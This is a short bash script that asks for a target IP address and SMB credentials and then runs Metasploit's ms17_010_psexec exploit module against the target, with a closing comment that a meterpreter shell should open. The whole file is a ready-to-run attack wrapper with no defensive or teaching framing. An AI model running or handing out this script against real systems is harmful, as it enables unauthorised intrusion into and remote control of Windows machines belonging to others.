#!/bin/bash


#get user input for target IP address
echo "Enter target host IP: "
read RHOST1

#get user input for SMBUser username
echo "Enter SMBUser username: "
read SMBUser1

#get user input for SMBPass password
echo "Enter SMBPass password: "
read SMBPass1

#run the exploit using metasploit-framework
msfconsole -x "use exploit/windows/smb/ms17_010_psexec;\
set RHOST $RHOST1;\
set SMBUser $SMBUser1;\
set SMBPass $SMBPass1;\
exploit"

#The meterpreter shell should open automatically
